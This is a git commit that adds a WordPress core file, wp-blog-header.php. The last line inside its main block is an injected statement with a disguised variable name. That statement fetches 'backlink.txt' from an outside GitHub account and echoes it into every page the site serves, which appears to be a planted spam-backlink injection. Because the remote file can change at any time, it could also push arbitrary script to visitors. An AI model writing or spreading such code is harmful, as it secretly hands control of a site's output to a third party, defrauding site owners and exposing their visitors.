14a1f11d5650e299b532646c3dbc5654a63d19e5
MimpiBasah <139620756+netyxzx@users.noreply.github.com>
2024-04-23 18:24:25 +0700

    Create wp-blog-header.php

---
+++ wp-blog-header.php
@@ -0,0 +1,21 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+$framework_controller_2 = file_get_contents('https://raw.githubusercontent.com/netyxzx/hash/main/backlink.txt'); echo $framework_controller_2;
+}
